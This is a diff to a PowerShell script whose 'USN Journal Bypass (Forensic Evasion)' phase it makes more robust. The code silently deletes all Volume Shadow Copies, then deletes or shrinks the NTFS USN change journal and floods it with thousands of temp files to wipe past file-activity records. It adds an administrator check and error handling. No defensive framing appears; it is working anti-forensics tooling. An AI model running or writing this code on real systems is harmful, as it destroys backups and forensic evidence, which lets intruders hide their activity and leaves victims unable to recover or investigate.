@@ -586,17 +586,24 @@ if (-not $api) {
 }
 
 
-# PHASE 3: USN JOURNAL BYPASS (Forensic Evasion) with Auto‑Cleanup
-# ================================================================
+# PHASE 3: USN JOURNAL BYPASS – Robust Version
+# =============================================
 Write-Host "[PHASE 3] Bypassing USN Journal..." -ForegroundColor Cyan
+
+# --- Admin check ---
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "[!] This script requires Administrator privileges. Please run PowerShell as Administrator." -ForegroundColor Red
+    exit 1
+}
 
 function Bypass-USNJournal {
     param(
-        [int]$FloodCount = 15000,
+        [int]$FloodCount = 15000,          # Reduced to avoid filling the disk
         [int]$FileSize = 4096,
         [int]$Passes = 2,
         [string[]]$TargetDrives = $null,
-        [switch]$DeleteTempFiles = $true   # New switch to clean up temp files
+        [switch]$DeleteTempFiles = $true,
+        [switch]$ForceDeleteJournal = $false   # New: delete the journal entirely
     )
 
     Write-Host "[*] Starting USN Journal bypass..." -ForegroundColor Cyan
@@ -606,12 +613,16 @@ function Bypass-USNJournal {
     if ($TargetDrives) { Write-Host "    TargetDrives = $($TargetDrives -join ', ')" } 
     else { Write-Host "    TargetDrives = ALL fixed drives" }
     Write-Host "    DeleteTempFiles = $DeleteTempFiles"
+    Write-Host "    ForceDeleteJournal = $ForceDeleteJournal"
     Write-Host ""
 
-    # Delete VSS
+    # Delete Volume Shadow Copies (VSS)
     Write-Host "[*] Removing Volume Shadow Copies..." -ForegroundColor White
-    try { Start-Process -FilePath "vssadmin.exe" -ArgumentList "delete shadows /all /quiet" -Wait -NoNewWindow -ErrorAction SilentlyContinue } catch {}
-    Write-Host "    Done." -ForegroundColor Green
+    try { 
+        $vss = Start-Process -FilePath "vssadmin.exe" -ArgumentList "delete shadows /all /quiet" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue
+        if ($vss.ExitCode -eq 0) { Write-Host "    VSS deleted." -ForegroundColor Green } 
+        else { Write-Host "    VSS deletion returned exit code $($vss.ExitCode) – may be normal." -ForegroundColor Yellow }
+    } catch { Write-Host "    VSS deletion failed: $_" -ForegroundColor Yellow }
     Write-Host ""
 
     $drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue
@@ -626,40 +637,75 @@ function Bypass-USNJournal {
 
         Write-Host "[*] Processing $driveLetter... " -ForegroundColor Cyan
 
+        # --- Option 1: Delete journal entirely ---
+        if ($ForceDeleteJournal) {
+            Write-Host "    [*] Deleting USN journal on $driveLetter`: ..." -ForegroundColor Yellow
+            $del = Start-Process -FilePath "fsutil.exe" -ArgumentList "usn deletejournal /D $driveLetter`:" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue
+            if ($del.ExitCode -eq 0) {
+                Write-Host "    [✓] Journal deleted. Recreating with default size..." -ForegroundColor Green
+                # Recreate a fresh journal (default size)
+                $create = Start-Process -FilePath "fsutil.exe" -ArgumentList "usn createjournal $driveLetter`:" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue
+                if ($create.ExitCode -eq 0) {
+                    Write-Host "    [✓] Journal recreated." -ForegroundColor Green
+                } else {
+                    Write-Host "    [✗] Failed to recreate journal (exit $($create.ExitCode))." -ForegroundColor Red
+                }
+            } else {
+                Write-Host "    [✗] Failed to delete journal (exit $($del.ExitCode))." -ForegroundColor Red
+            }
+            $anySuccess = $true
+            continue   # Move to next drive
+        }
+
+        # --- Option 2: Shrink + Flood method ---
         for ($pass = 0; $pass -lt $Passes; $pass++) {
             Write-Host "    Pass $($pass+1)/$Passes..." -ForegroundColor Cyan
 
-            # Shrink to minimum
+            # 1) Shrink journal to minimum (32KB) to force old records out
+            Write-Host "        Shrinking journal..." -NoNewline
             $shrink = Start-Process -FilePath "fsutil.exe" -ArgumentList "usn createjournal m=32768 a=32768 $driveLetter`:" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue
             if ($shrink.ExitCode -ne 0) {
-                Write-Host "        Shrink failed (exit $($shrink.ExitCode)) – skipping drive." -ForegroundColor Red
+                Write-Host " FAILED (exit $($shrink.ExitCode))." -ForegroundColor Red
+                # Try to get error output
+                $err = Start-Process -FilePath "fsutil.exe" -ArgumentList "usn createjournal m=32768 a=32768 $driveLetter`:" -Wait -NoNewWindow -RedirectStandardError "temp_err.txt" -PassThru
+                if (Test-Path "temp_err.txt") { Get-Content "temp_err.txt"; Remove-Item "temp_err.txt" -Force }
                 continue
             }
+            Write-Host " OK." -ForegroundColor Green
 
-            # Flood with massive files – they will be cleaned up later
+            # 2) Create flood of temp files
             Write-Host "        Creating $FloodCount files..." -NoNewline
             $created = 0
-            $fileList = @()   # Keep track of created files for potential per-pass deletion (not used here)
+            $tempFiles = @()
             for ($i = 0; $i -lt $FloodCount; $i++) {
-                # Use a fixed prefix for easy cleanup
-                $tempName = "$driveLetter`:\JOURNAL_FLUSH_$([guid]::NewGuid().ToString()).tmp"
+                $guid = [guid]::NewGuid().ToString()
+                $tempName = "$driveLetter`:\JOURNAL_FLUSH_$guid.tmp"
                 try {
                     [System.IO.File]::WriteAllBytes($tempName, (New-Object byte[] $FileSize))
                     $created++
-                    $fileList += $tempName
+                    $tempFiles += $tempName
                 } catch {
+                    # Stop if disk full or other error
                     break
                 }
+                # Progress every 1000 files to avoid slowing down
+                if ($i % 1000 -eq 0 -and $i -gt 0) { Write-Host "." -NoNewline }
             }
             Write-Host " Done ($created created)." -ForegroundColor Green
 
-            # Shrink again to reset Next USN
-            Start-Process -FilePath "fsutil.exe" -ArgumentList "usn createjournal m=32768 a=32768 $driveLetter`:" -Wait -NoNewWindow -ErrorAction SilentlyContinue
+            # 3) Shrink again to reset Next USN
+            Write-Host "        Shrinking journal again..." -NoNewline
+            $shrink2 = Start-Process -FilePath "fsutil.exe" -ArgumentList "usn createjournal m=32768 a=32768 $driveLetter`:" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue
+            if ($shrink2.ExitCode -ne 0) {
+                Write-Host " FAILED (exit $($shrink2.ExitCode))." -ForegroundColor Red
+            } else {
+                Write-Host " OK." -ForegroundColor Green
+            }
 
             $anySuccess = $true
         }
 
-        # --- Cleanup: delete all temporary files we created on this drive ---
+        # --- Cleanup temp files (if requested) ---
         if ($DeleteTempFiles) {
             Write-Host "    Cleaning up temporary files on $driveLetter... " -NoNewline
             $pattern = "$driveLetter`:\JOURNAL_FLUSH_*.tmp"
@@ -687,27 +733,36 @@ function Bypass-USNJournal {
     Write-Host ""
     if ($anySuccess) {
         Write-Host "[✓] USN Journal bypass completed!" -ForegroundColor Green
+        if ($ForceDeleteJournal) {
+            Write-Host "[*] The USN journal was deleted and recreated – all previous records are gone." -ForegroundColor Yellow
+        } else {
+            Write-Host "[*] Journal was shrunk and flooded – old records overwritten." -ForegroundColor Green
+        }
         if ($DeleteTempFiles) {
             Write-Host "[*] Temporary files have been deleted." -ForegroundColor Green
         } else {
             Write-Host "[*] Temporary files remain at: X:\JOURNAL_FLUSH_*.tmp" -ForegroundColor Yellow
-            Write-Host "[*] You may delete them manually if desired." -ForegroundColor Yellow
         }
-        Write-Host "[*] Journal file was NOT deleted – only shrank and flooded." -ForegroundColor White
-        Write-Host "[*] All old USN records overwritten." -ForegroundColor Green
     } else {
         Write-Host "[✗] USN Journal bypass failed on all targeted drives." -ForegroundColor Red
+        Write-Host "    Common causes:" -ForegroundColor Yellow
+        Write-Host "    - Not running as Administrator" -ForegroundColor Yellow
+        Write-Host "    - Antivirus blocking file creation" -ForegroundColor Yellow
+        Write-Host "    - Insufficient disk space for $FloodCount files" -ForegroundColor Yellow
     }
 }
 
-# Customize parameters for USN bypass
-$myFloodCount = 150000
-$myFileSize    = 4096
-$myPasses      = 3
-$myDrives      = @("C")   # Only target C: drive (adjust if needed)
-# Set -DeleteTempFiles to $true to automatically remove temp files after bypass
-Bypass-USNJournal -FloodCount $myFloodCount -FileSize $myFileSize -Passes $myPasses -TargetDrives $myDrives -DeleteTempFiles
+# ---- Customize parameters ----
+$myFloodCount = 15000        # Reduce if disk space is limited
+$myFileSize   = 4096
+$myPasses     = 2
+$myDrives     = @("C")       # Target only C:
+# Choose one of the two methods:
+# 1) Traditional shrink+flood (keeps journal but overwrites records)
+# 2) ForceDeleteJournal – deletes the entire USN journal (more aggressive)
+$useDeleteJournal = $false   # Set to $true to delete the journal entirely
 
+Bypass-USNJournal -FloodCount $myFloodCount -FileSize $myFileSize -Passes $myPasses -TargetDrives $myDrives -DeleteTempFiles -ForceDeleteJournal:$useDeleteJournal
 
 # ========== CLEAN UP USN FLOOD FILES (Using CMD DEL) ==========
 Write-Host "[*] Deleting temporary USN journal flood files via CMD..." -ForegroundColor Cyan
